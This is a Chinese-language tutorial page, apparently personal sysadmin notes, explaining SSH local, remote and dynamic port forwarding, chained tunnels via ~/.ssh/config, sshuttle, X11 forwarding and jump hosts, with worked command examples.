SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH还
能够将其他 TCP 端口的网络数据通过 SSH链接来转发，并且自动提供了相应的
加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为SSH 为
其他 TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，
LDAP 这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传
输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允
许SSH 的连接，也能够通过将 TCP 端口转发来使用 SSH 进行通讯
</p>

<p>
SSH 端口转发能够提供两大功能：
</p>

<ul class="org-ul">
<li>加密 SSH Client 端至 SSH Server 端之间的通讯数据</li>
<li>突破防火墙的限制完成一些之前无法建立的 TCP 连接</li>
</ul>

<p>
端口转发有三种使用方法：动态转发，本地转发，远程转发
</p>

<p>
工具：
</p>

<p>
mac工具：ssh tunnel
</p>

<p>
教程：阮一峰 <a href="https://wangdoc.com/ssh/port-forwarding.html">https://wangdoc.com/ssh/port-forwarding.html</a>
</p>

<p>
Linux端口转发的几种常用方法
</p>
<ul class="org-ul">
<li>SSH 端口转发</li>
<li>iptables 端口转发</li>
<li>firewall 端口转发</li>
<li>rinetd 端口转发</li>
<li>ncat 端口转发</li>
<li>socat 端口转发</li>
<li>portmap 端口转发</li>
</ul>

<p>
参考：<a href="https://cloud.tencent.com/developer/article/1688152">https://cloud.tencent.com/developer/article/1688152</a>
</p>
</div>
<div id="outline-container-h:d4e86230-854a-45ec-9fa9-cf51d2b64a75" class="outline-4">
<h4 id="h:d4e86230-854a-45ec-9fa9-cf51d2b64a75">SSH本地端口转（特定场合会用到）</h4>
<div class="outline-text-4" id="text-h:d4e86230-854a-45ec-9fa9-cf51d2b64a75">
<p>
本地转发（local forwarding）指的是，SSH服务器作为中介的跳板机，建立本
地计算机与特定目标网站之间的加密连接。本地转发是在本地计算机的SSH 客户
端建立的转发规则。
</p>

<p>
它会指定一个本地端口（local-port），所有发向那个端口的请求，都会转发到
SSH 跳板机（tunnel-host），然后 SSH跳板机作为中介，将收到的请求发到目
标服务器（target-host）的目标端口（target-port）。
</p>

<p>
特点：本地执行ssh命令，本地打开端口连接ssh跳板机访问目标主机
</p>

<p>
SSH本地端口转发
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -L [local:]local-port:target-host:target-port tunnel-host  <span style="color: #b22222;"># </span><span style="color: #b22222;">local&#21487;&#30465;&#30053;</span>
</pre>
</div>

<p>
选项：
</p>

<pre class="example" id="orgbefbdf8">
-L 表示本地转发 
-f 后台启用
-N 不打开远程shell，处于等待状态;即不执行远程命令（专门做端口转发）
-g 启用网关功能；修改sshd 配置GatewayPorts yes。本地转发端口默认绑定在回环地址上，只能使用localhost:port或127.0.0.1:port的形式,-g允许外界主机连接
</pre>

<p>
范例：本地 <code>2121</code> 端口与目标网站 <code>www.example.com</code> 的80端口之间建立
SSH隧道, tunnel-host为SSH 跳板机
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -L 2121:www.example.com:80 tunnel-host -N
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35775;&#38382;&#26412;&#26426;&#30340;2121&#31471;&#21475;&#65292;&#23601;&#26159;&#35775;&#38382;www.example.com&#30340;80&#31471;&#21475;</span>
curl http://localhost:2121
&#27880;&#24847;&#65292;&#26412;&#22320;&#31471;&#21475;&#36716;&#21457;&#37319;&#29992; HTTP &#21327;&#35758;&#65292;&#19981;&#29992;&#36716;&#25104; SOCKS5 &#21327;&#35758;&#12290;
</pre>
</div>

<p>
范例：加密访问邮件获取协议 POP3
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -L 1100:mail.example.com:110 mail.example.com
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#26412;&#26426;&#30340;1100&#31471;&#21475;&#65292;&#32465;&#23450;&#37038;&#20214;&#26381;&#21153;&#22120;mail.example.com&#30340;110&#31471;&#21475;&#65288;POP3 &#21327;&#35758;&#30340;&#40664;&#35748;&#31471;&#21475;&#65289;&#12290;&#31471;&#21475;&#36716;&#21457;&#24314;&#31435;&#20197;&#21518;&#65292;POP3 &#37038;&#20214;&#23458;&#25143;&#31471;&#21482;&#38656;&#35201;&#35775;&#38382;&#26412;&#26426;&#30340;1100&#31471;&#21475;&#65292;&#35831;&#27714;&#23601;&#20250;&#36890;&#36807; SSH &#36339;&#26495;&#26426;&#65288;&#36825;&#37324;&#26159;mail.example.com&#65289;&#65292;&#33258;&#21160;&#36716;&#21457;&#21040;mail.example.com&#30340;110&#31471;&#21475;</span>
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26412;&#22320;150&#22320;&#22336;3366&#35831;&#27714;&#21453;&#20195;&#21040;&#36828;&#31471;222&#22320;&#22336;&#19978;&#30340;&#20869;&#32593;3306&#31471;&#21475;
[root@hd-test-all-01 ~]# ssh -p 10022 -Nf -L 192.168.1.150:3366:172.16.166.61:3306 hdzuoye@47.99.60.222
[root@hd-test-all-01 ~]# ss -tnl|grep 3366
192.168.1.150:3366
[root@hd-test-all-01 ~]# mysql -h 192.168.1.150 -P 3366 -uspark -p
mysql&gt; show databases;
+-----------------------+
| Database              |
+-----------------------+
| information_schema    |
| operational_analytics |

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403;&#35775;&#38382;&#26412;&#26426;&#30340;9527&#30340;&#31471;&#21475;&#26102;&#65292;&#34987;&#21152;&#23494;&#21518;&#36716;&#21457;&#21040;sshsrv&#30340;ssh&#26381;&#21153;&#65292;&#20877;&#35299;&#23494;&#34987;&#36716;&#21457;&#21040;telnetsrv:23</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">data&lt;--&gt;localhost:9527 &lt;--&gt;localhost:XXXXX&lt;--&gt;sshsrv:22&lt;--&gt;sshsrv:YYYYY&lt;--&gt;telnetsrv:23</span>

ssh &#8211;L 9527:telnetsrv:23 -Nfg sshsrv
telnet 127.0.0.1 9527
</pre>
</div>

<p>
范例：本地端口转发
</p>


<figure id="orgd33ecb5">
<img src="images/image-20210120194923288.png" alt="image-20210120194923288.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#ssh -fNL 9527:10.0.0.28:80 10.0.0.18
[root@centos8 ~]#curl 127.0.0.1:9527
</pre>
</div>

<p>
范例：简易VPN
</p>

<p>
VPN用来在外网与内网之间建立一条加密通道。内网的服务器不能从外网直接访
问，必须通过一个跳板机，如果本机可以访问跳板机，就可以使用SSH 本地转发，
简单实现一个 VPN。
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -L 2080:corp-server:80 -L 2443:corp-server:443 tunnel-host -N
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36890;&#36807; SSH &#36339;&#26495;&#26426;&#65292;&#23558;&#26412;&#26426;&#30340;2080&#31471;&#21475;&#32465;&#23450;&#20869;&#32593;&#26381;&#21153;&#22120;&#30340;80&#31471;&#21475;&#65292;&#26412;&#26426;&#30340;2443&#31471;&#21475;&#32465;&#23450;&#20869;&#32593;&#26381;&#21153;&#22120;&#30340;443&#31471;&#21475;</span>
</pre>
</div>

<p>
如果经常使用本地转发，可以将设置写入 SSH客户端的用户个人配置文件
（ <code>~/.ssh/config</code> ）
</p>

<pre class="example" id="orgfd59999">
Host test.example.com
LocalForward client-IP:client-port server-IP:server-port
</pre>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -i ~/.ssh/coolio.example.key -f -N -L 9906:127.0.0.1:3306 coolio@database.example.com
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22312;&#26412;&#22320;9906&#31471;&#21475;&#19982;coolio@database.example.com&#20043;&#38388;&#24314;&#31435;&#19968;&#26465;&#38567;&#36947;&#65292;&#38567;&#36947;&#30340;&#20986;&#21475;&#26159;database.example.com&#30340;127.0.0.1:3306&#65292;&#20063;&#23601;&#26159;coolio@database.example.com&#25910;&#21040;&#26412;&#26426;&#30340;&#35831;&#27714;&#20197;&#21518;&#65292;&#36716;&#21457;&#32473;&#33258;&#24049;&#30340;3306&#31471;&#21475;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">-f &#21518;&#21488;&#21551;&#29992;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">-N &#19981;&#25171;&#24320;&#36828;&#31243;shell&#65292;&#22788;&#20110;&#31561;&#24453;&#29366;&#24577;;&#21363;&#19981;&#25191;&#34892;&#36828;&#31243;&#21629;&#20196;&#65288;&#19987;&#38376;&#20570;&#31471;&#21475;&#36716;&#21457;&#65289;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">~/.ssh/config</span>
Host tunnel
    User coolio
    HostName database.example.com
    Port 22
    IdentityFile ~/.ssh/coolio.example.key
    LocalForward 9906 127.0.0.1:3306

<span style="color: #b22222;">#</span><span style="color: #b22222;">command</span>
ssh -f -N tunnel
</pre>
</div>

<p>
参考：<a href="https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/">https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/</a>
</p>
</div>
<div id="outline-container-h:7f3ee002-4f6c-4a8e-9793-c8bdbc77c2d4" class="outline-5">
<h5 id="h:7f3ee002-4f6c-4a8e-9793-c8bdbc77c2d4">级联及代理工具</h5>
<div class="outline-text-5" id="text-h:7f3ee002-4f6c-4a8e-9793-c8bdbc77c2d4">
<p>
范例：级联。北京到新加坡建立隧道，本地通过新加坡与孟买建立隧道
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">~/.ssh/config</span>
Host b-t-s <span style="color: #b22222;">#</span><span style="color: #b22222;">beijing to singapore  backend</span>
    User jasper-xu
    HostName 3.xx.xx.xx
    IdentityFile ~/tmp/worker/jasper-xu.pem
    LocalForward 9101 4.xx.xx.xx:22
Host s-t-b <span style="color: #b22222;"># </span><span style="color: #b22222;">singapore to bombay backend</span>
    User jasper-xu
    HostName 127.0.0.1
    Port 9101
    IdentityFile ~/tmp/worker/jasper-xu.pem
    LocalForward 9102 1.xx.xx.xx:22
Host t-ops
    User jasper-xu
    HostName 127.0.0.1
    Port 9102
    IdentityFile ~/tmp/worker/jasper-xu.pem
    LocalForward 8080 172.21.28.207:8080
    LocalForward 8848 172.21.39.120:8848
<span style="color: #b22222;">#</span><span style="color: #b22222;">----login--</span>
Host bombay  <span style="color: #b22222;"># </span><span style="color: #b22222;">connnect bombay from local</span>
    User jasper-xu
    HostName 127.0.0.1
    Port 9102
    IdentityFile ~/tmp/worker/jasper-xu.pem
Host 120  <span style="color: #b22222;"># </span><span style="color: #b22222;">connnect  172.21.39.120 from local</span>
    User jasper-xu
    HostName 172.21.39.120
    <span style="color: #b22222;">#</span><span style="color: #b22222;">HostName 127.0.0.1</span>
    Port ssh
    IdentityFile ~/tmp/worker/jasper-xu.pem
    ProxyCommand ssh -q -W %h:%p bombay <span style="color: #b22222;">#</span><span style="color: #b22222;">-q only required on Mac</span>
    RequestTTY yes
    RemoteCommand sudo su -    
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25191;&#34892;&#36716;&#21457;</span>
ssh -f -N b-t-s
ssh -f -N s-t-b
ssh -f -N t-ops

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;1&#65292;&#30331;&#24405;bombay</span>
ssh  bombay
[jasper-xu@ip-172-21-39-187 ~]$

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;2 &#35775;&#38382;8080</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27983;&#35272;&#22120;&#35775;&#38382;&#65306;http://127.0.0.1:8080</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;3 &#36339;&#26495;</span>
&gt; ssh 120
[root@ip-172-21-39-120 ~]#



&gt; cat to-bombay.sh
<span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/zsh</span>
ps -ef|grep <span style="color: #8b2252;">'\-t\-'</span> |awk <span style="color: #8b2252;">'{print $2}'</span>|  xargs kill
ssh -f -N b-t-s
ssh -f -N s-t-b
ssh -f -N t-stg
</pre>
</div>

<p>
<b>ssh tunnel工具</b>
</p>


<figure id="orgb0c6c2d">
<img src="images/image-20211122140940050.png" alt="image-20211122140940050.png" width="50%">

</figure>


<figure id="orgc7a04d7">
<img src="images/image-20211122141019274.png" alt="image-20211122141019274.png" width="50%">

</figure>

<p>
无法导入私钥：的私钥是新格式，不支持旧格式
</p>

<div class="org-src-container">
<pre class="src src-sh">brew install putty

puttygen ~/.ssh/id_rsa -O private-openssh -o a.pem
</pre>
</div>

<p>
<b>windows xshell 设置方法</b>
</p>

<p>
beijing-to-singapore: ssh连接北京，本地隧道9101到新加坡ssh端口
</p>


<figure id="org303d8b8">
<img src="images/image-20211217051955933.png" alt="image-20211217051955933.png" width="50%">

</figure>


<figure id="org8df24de">
<img src="images/image-20211217052022361.png" alt="image-20211217052022361.png" width="50%">

</figure>


<figure id="org7f57a9c">
<img src="images/image-20211217052042961.png" alt="image-20211217052042961.png" width="50%">

</figure>


<figure id="orgf78fb0f">
<img src="images/image-20211217052104728.png" alt="image-20211217052104728.png" width="50%">

</figure>

<p>
singapore-to-bombay: ssh连接本地9101，本地隧道9102到孟买ssh端口
</p>

<p>
登录bombay：ssh连接本地9102端口
</p>


<figure id="orgc8ee889">
<img src="images/image-20211217052516313.png" alt="image-20211217052516313.png" width="50%">

</figure>

<p>
登录120：通过bombay跳板到其它机器，ssh连接120机器，设置代理服务器连接本地9102端口
</p>


<figure id="orgd6574d2">
<img src="images/image-20211217052918501.png" alt="image-20211217052918501.png" width="50%">

</figure>


<figure id="orgbd53d25">
<img src="images/image-20211217052906963.png" alt="image-20211217052906963.png" width="50%">

</figure>


<figure id="org869e3c8">
<img src="images/image-20211217052848391.png" alt="image-20211217052848391.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:5b735cbf-9f07-42cd-9c54-4700aea3ef10" class="outline-5">
<h5 id="h:5b735cbf-9f07-42cd-9c54-4700aea3ef10">创建到目标主机的持久化连接</h5>
<div class="outline-text-5" id="text-h:5b735cbf-9f07-42cd-9c54-4700aea3ef10">
<div class="org-src-container">
<pre class="src src-sh">ssh -MNf &#29992;&#25143;&#21517;@&#20027;&#26426;
</pre>
</div>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -p10022 -MNf -L 192.168.1.150:33061:172.16.166.61:3306 hdzuoye@114.55.105.193
ssh -p10022 -MNf -L 192.168.1.150:54323:172.19.196.33:5432 hdzuoye@114.55.105.193
ssh -p10022 -MNf -L 192.168.1.150:33306:172.16.166.13:3306 hdzuoye@114.55.105.193
</pre>
</div>

<p>
在后台创建到目标主机的持久化连接，将这个命令和你 <code>~/.ssh/config</code> 中的配置结合使用：
</p>

<div class="org-src-container">
<pre class="src src-sh">Host host
ControlPath ~/.ssh/master-%r@%h:%p
ControlMaster no
</pre>
</div>

<p>
所有到目标主机的SSH连接都将使用持久化SSH套接字，如果你使用SSH定期同步
文件（使用rsync/sftp/cvs/svn），这个命令将非常有用，因为每次打开一个
SSH连接时不会创建新的套接字。
</p>
</div>
</div>
<div id="outline-container-h:d48282ff-0d30-4c75-909c-fa27294d2e7a" class="outline-5">
<h5 id="h:d48282ff-0d30-4c75-909c-fa27294d2e7a">代理工具 sshuttle</h5>
<div class="outline-text-5" id="text-h:d48282ff-0d30-4c75-909c-fa27294d2e7a">
<p>
这是一个神器。hadoop这些集群没法通过单一的端口转发代理实现集群的访问，
VPN有些太重，ubuntu下直接用 <code>sudo apt install -y sshuttle</code> 就可以安装
了。这个工具非常巧妙，利用iptables的端口转发功能，直接把指定目标网络的
请求通过ssh代理到远程，实现了非常类似于VPN的功能，但是几乎零配置，
</p>

<p>
例子:
</p>

<div class="org-src-container">
<pre class="src src-sh">sshuttle -r user@remote_ip 10.0.0.0/8
</pre>
</div>

<p>
代表将10.0.0.0/8这个网段的请求走SSH代理，是不是很容易使用？此外，还支
持&#x2013;dns,&#x2013;auto-hosts, &#x2013;auto-nets等十分有用的参数，根据实际情况去选用
即可。
</p>

<p>
sshuttle非常类似于VPN，但是比VPN更轻量，而且无需管理。值得注意的是，本
质上这个工具是利用了端口转发的原理，并不是真正的VPN，所以对于ICMP这类
的协议是没用的，也就是说，对于ping命令是无效的。
</p>
</div>
</div>
</div>
<div id="outline-container-h:c154af0a-bb85-4fd2-b684-dbe405a57c4a" class="outline-4">
<h4 id="h:c154af0a-bb85-4fd2-b684-dbe405a57c4a">SSH远程端口转发</h4>
<div class="outline-text-4" id="text-h:c154af0a-bb85-4fd2-b684-dbe405a57c4a">
<p>
远程端口指的是在远程 SSH 服务器建立的转发规则。
</p>

<p>
这种场景比较特殊，主要针对内网的情况。本地计算机在外网，SSH跳板机和目
标服务器都在内网，而且本地计算机无法访问内网之中的 SSH跳板机，但是 SSH
跳板机可以访问本机计算机。
</p>

<p>
由于本机无法访问内网 SSH 跳板机，就无法从外网发起 SSH隧道，建立端口转
发。必须反过来，从 SSH跳板机发起隧道，建立端口转发，这时就形成了远程端
口转发。
</p>

<p>
特点：ssh跳板机执行ssh命令，本地打开端口连接ssh跳板机访问目标主机
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -R [local:]local-port:target-host:target-port local
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39318;&#20808;&#38656;&#35201;&#27880;&#24847;&#65292;&#19981;&#26159;&#22312;&#26412;&#26426;&#25191;&#34892;&#30340;&#65292;&#32780;&#26159;&#22312; SSH &#36339;&#26495;&#26426;&#25191;&#34892;&#30340;&#65292;&#20174;&#36339;&#26495;&#26426;&#21435;&#36830;&#25509;&#26412;&#22320;&#35745;&#31639;&#26426;&#12290;-R&#21442;&#25968;&#34920;&#31034;&#36828;&#31243;&#31471;&#21475;&#36716;&#21457;&#65292;local-port&#26159;&#26412;&#22320;&#35745;&#31639;&#26426;&#30340;&#31471;&#21475;&#65292;target-host&#21644;target-port&#26159;&#30446;&#26631;&#26381;&#21153;&#22120;&#21450;&#20854;&#31471;&#21475;&#65292;local&#26159;&#26412;&#22320;&#35745;&#31639;&#26426;</span>
</pre>
</div>

<p>
示例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#36339;&#26495;&#26426;&#25191;&#34892;&#19979;&#38754;&#30340;&#21629;&#20196;&#65292;&#32465;&#23450;&#26412;&#22320;&#35745;&#31639;&#26426;&#30340;2121&#31471;&#21475;&#65292;&#21435;&#35775;&#38382;www.example.com:80</span>
ssh -R 2121:www.example.com:80 local -N
curl http://localhost:2121

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#35753;sshsrv&#20390;&#21548;9527&#31471;&#21475;&#30340;&#35775;&#38382;&#65292;&#22914;&#26377;&#35775;&#38382;&#65292;&#23601;&#21152;&#23494;&#21518;&#36890;&#36807;ssh&#26381;&#21153;&#36716;&#21457;&#35831;&#27714;&#21040;&#26412;&#26426;ssh&#23458;&#25143;&#31471;&#65292;&#20877;&#30001;&#26412;&#26426;&#35299;&#23494;&#21518;&#36716;&#21457;&#21040;telnetsrv:23</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">Data&lt;--&gt;sshsrv:9527&lt;--&gt;sshsrv:22&lt;--&gt;localhost:XXXXX&lt;--&gt;localhost:YYYYY&lt;--</span>
&gt;telnetsrv:23

ssh &#8211;R 9527:telnetsrv:23 &#8211;Nf sshsrv
</pre>
</div>

<p>
范例：远程端口转发并实现网关功能
</p>


<figure id="org526fffd">
<img src="images/image-20210120194948379.png" alt="image-20210120194948379.png" width="50%">

</figure>

<p>
ssh跳板机从内向外发起主动连接，这样本地访问就不是从外面主动进来，就不
会被防火墙拦截了。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#30446;&#26631;&#20027;&#26426;&#24320;&#21551;http&#26381;&#21153;</span>
[root@lan-server ~]#yum -y install httpd;systemctl start httpd;<span style="color: #483d8b;">echo</span> website On 10.0.0.28 &gt; /var/www/html/index.html

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#22320;10.0.0.8&#24320;&#21551;ssh&#32593;&#20851;&#21151;&#33021; GatewayPorts yes</span>
[root@ssh-server ~]#vim /etc/ssh/sshd_config
GatewayPorts yes
[root@ssh-server ~]#systemctl restart sshd

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36339;&#26495;&#25191;&#34892;ssh&#31574;&#30053;</span>
[root@ssh-client ~]#ssh -fNgR 9527:10.0.0.28:80 10.0.0.8
root@10.0.0.8<span style="color: #8b2252;">'s password:</span>

<span style="color: #8b2252;"># &#20174;&#20854;&#23427;&#26381;&#21153;&#22120;&#35775;&#38382;&#26412;&#22320;10.0.0.8&#31471;&#21475;</span>
<span style="color: #8b2252;">[root@centos6 ~]#curl 10.0.0.8:9527</span>
<span style="color: #8b2252;">website On 10.0.0.28</span>
<span style="color: #8b2252;">[root@centos7 ~]#curl 10.0.0.8:9527</span>
<span style="color: #8b2252;">website On 10.0.0.28</span>
</pre>
</div>

<p>
如果经常执行远程端口转发，可以将设置写入 SSH客户端的用户个人配置文件
（ <code>~/.ssh/config</code> ）
</p>

<div class="org-src-container">
<pre class="src src-sh">Host test.example.com
RemoteForward local-IP:local-port target-ip:target-port
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d713d82f-4ef6-4b8b-b584-cd8b06c9129f" class="outline-4">
<h4 id="h:d713d82f-4ef6-4b8b-b584-cd8b06c9129f">SSH动态端口转发</h4>
<div class="outline-text-4" id="text-h:d713d82f-4ef6-4b8b-b584-cd8b06c9129f">
<p>
动态转发指的是，本机与 SSH服务器之间创建了一个加密连接，然后本机内部针
对某个端口的通信，都通过这个加密连接转发。它的一个使用场景就是，访问所
有外部网站，都通过SSH 转发。
</p>

<p>
动态转发需要把本地端口绑定到 SSH 服务器。至于 SSH服务器要去访问哪一个
网站，完全是动态的，取决于原始通信，所以叫做动态转发。
</p>

<p>
特点：本地执行ssh命令，本地打开端口连接ssh跳板机访问目标主机，目标主机
地址是动态的。
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -D local-port tunnel-host -N
<span style="color: #b22222;">#</span><span style="color: #b22222;">-D&#34920;&#31034;&#21160;&#24577;&#36716;&#21457;&#65292;local-port&#26159;&#26412;&#22320;&#31471;&#21475;&#65292;tunnel-host&#26159; SSH &#26381;&#21153;&#22120;&#65292;-N&#34920;&#31034;&#36825;&#20010; SSH &#36830;&#25509;&#21482;&#36827;&#34892;&#31471;&#21475;&#36716;&#21457;&#65292;&#19981;&#30331;&#24405;&#36828;&#31243; Shell&#65292;&#19981;&#33021;&#25191;&#34892;&#36828;&#31243;&#21629;&#20196;&#65292;&#21482;&#33021;&#20805;&#24403;&#38567;&#36947;</span>
</pre>
</div>


<figure id="orgdb9e1fa">
<img src="images/image-20210120195813397.png" alt="image-20210120195813397.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403;&#29992;firefox&#35775;&#38382;internet&#26102;&#65292;&#26412;&#26426;&#30340;1080&#31471;&#21475;&#20570;&#20026;&#20195;&#29702;&#26381;&#21153;&#22120;&#65292;firefox&#30340;&#35775;&#38382;&#35831;&#27714;&#34987;&#36716;&#21457;&#21040;</span>
sshserver&#19978;&#65292;&#30001;sshserver&#26367;&#20043;&#35775;&#38382;internet

ssh -D 1080 root@sshserver -fNg
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36825;&#31181;&#36716;&#21457;&#37319;&#29992;&#20102; SOCKS5 &#21327;&#35758;&#12290;&#35775;&#38382;&#22806;&#37096;&#32593;&#31449;&#26102;&#65292;&#38656;&#35201;&#25226; HTTP &#35831;&#27714;&#36716;&#25104; SOCKS5 &#21327;&#35758;&#65292;&#25165;&#33021;&#25226;&#26412;&#22320;&#31471;&#21475;&#30340;&#35831;&#27714;&#36716;&#21457;&#20986;&#21435;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22312;&#26412;&#26426;firefox&#35774;&#32622;&#20195;&#29702;socket proxy:127.0.0.1:1080</span>
curl --socks5 127.0.0.1:1080 http://www.google.com
</pre>
</div>

<p>
范例：动态端口转发实现科学上网方式1 ssh client端执行
</p>


<figure id="org28f4395">
<img src="images/image-20210120195833477.png" alt="image-20210120195833477.png">

</figure>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#ssh -fND 9527 10.0.0.18
</pre>
</div>


<figure id="org986a564">
<img src="images/image-20210120195855252.png" alt="image-20210120195855252.png" width="50%">

</figure>

<p>
范例：动态端口转发实现科学上网方式2 减少成本， vps执行
</p>


<figure id="org60946d2">
<img src="images/image-20210120195908239.png" alt="image-20210120195908239.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">[root@vps ~]#ssh -gfND 9527 10.0.0.18
[root@centos6 ~]#curl --socks5 10.0.0.18:9527 http://10.0.0.28
google On 10.0.0.28
[root@centos7 ~]#curl --socks5 10.0.0.18:9527 http://10.0.0.28
google On 10.0.0.28
</pre>
</div>

<p>
如果经常使用动态转发，可以将设置写入 SSH客户端的用户个人配置文件
（ <code>~/.ssh/config</code> ）。
</p>

<div class="org-src-container">
<pre class="src src-sh">DynamicForward tunnel-host:local-port
</pre>
</div>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">ssh -p 65522 -i dev-server.pem -D 10800 root@3.x.x.71 -Ng</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">~/.ssh/config</span>
Host dhost
  Hostname 3.x.x.71
  Port 65522
  User root
  IdentityFile /d/dev-server.pem
  DynamicForward 10800

ssh dhost -Ng <span style="color: #b22222;">#</span><span style="color: #b22222;">-f &#21518;&#21488;&#21551;&#21160;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27983;&#35272;&#22120;&#35774;&#32622;&#20195;&#29702;socket5 127.0.0.1:10800</span>
</pre>
</div>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-sh">ssh -L 1080:localhost:9999 JumpHost -t ssh -D 9999 HostB
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36825;&#26465;&#21629;&#20196;&#20250;&#22312;&#30331;&#24405;JumpHost&#26102;&#65292;&#24314;&#31435;&#26412;&#26426;1080&#31471;&#21475;&#21040;JumpHost 9999&#31471;&#21475;&#30340;&#36716;&#21457;&#65292;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21516;&#26102;&#22312;JumpHost&#19978;&#25191;&#34892;ssh&#30331;&#24405;HostB&#65292;&#21516;&#26102;&#30417;&#21548;9999&#31471;&#21475;&#21160;&#24577;&#36716;&#21457;&#21040;HostB&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20110;&#26159;&#65292;&#25152;&#26377;&#21040;&#26412;&#26426;1080&#31471;&#21475;&#30340;&#36830;&#25509;&#65292;&#37117;&#34987;&#20195;&#29702;&#21040;&#20102;&#36828;&#31243;&#30340;HostB&#19978;&#21435;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:afb334f1-abe9-4ac0-b289-5dbaf0b73c20" class="outline-4">
<h4 id="h:afb334f1-abe9-4ac0-b289-5dbaf0b73c20">X 协议转发</h4>
<div class="outline-text-4" id="text-h:afb334f1-abe9-4ac0-b289-5dbaf0b73c20">
<p>
所有图形化应用程序都是X客户程序,能够通过tcp/ip连接远程X服务器,数据没有
加密，但是它通过ssh连接隧道安全进行
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">remotehost&#20027;&#26426;&#19978;&#30340;gedit&#24037;&#20855;&#65292;&#23558;&#20250;&#26174;&#31034;&#22312;&#26412;&#26426;&#30340;X&#26381;&#21153;&#22120;&#19978;,&#20256;&#36755;&#30340;&#25968;&#25454;&#23558;&#36890;&#36807;ssh&#36830;&#25509;&#21152;&#23494;</span>
ssh -X user@remotehost gedit
</pre>
</div>

<p>
范例：在windows上使用mobaXtrem的X server 显示 Linux 的图形工具
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos ~]#yum install xorg-x11-xauth xorg-x11-fonts-* xorg-x11-font-utils xorg-x11-fonts-Type1 firefox
[root@centos ~]#exit
[root@centos ~]#firefox
</pre>
</div>

<p>
范例：在windows上使用xshell的X server 显示 Linux 的图形工具
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos ~]# export <span style="color: #a0522d;">DISPLAY</span>=10.0.0.1:0.0
[root@centos ~]# yum -y install xclock
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1894b25a-dcfa-4f71-9b01-03edac9fd6c4" class="outline-4">
<h4 id="h:1894b25a-dcfa-4f71-9b01-03edac9fd6c4">跳转主机</h4>
<div class="outline-text-4" id="text-h:1894b25a-dcfa-4f71-9b01-03edac9fd6c4">
<p>
有些服务器只能在内网访问。您可以使用网关服务器作为跳转主机，然后无需先
登录网关并ssh从那里运行。另一个好处是您不必在网关机器中存储凭据，例如
私钥，一切都像您直接登录目标机器一样。
</p>

<p>
<code>~/.ssh/config</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">Host gateway
    ...

Host foobar
    HostName internal.machine
    User foobar
    IdentityFile ~/.ssh/foobar.pem
    ProxyJump gateway
</pre>
</div>

<p>
代理也可以实现
</p>

<div class="org-src-container">
<pre class="src src-sh">Host bombay  <span style="color: #b22222;"># </span><span style="color: #b22222;">connnect bombay from local</span>
    User jasper-xu
    HostName 127.0.0.1
    Port 9102
    IdentityFile ~/tmp/worker/jasper-xu.pem
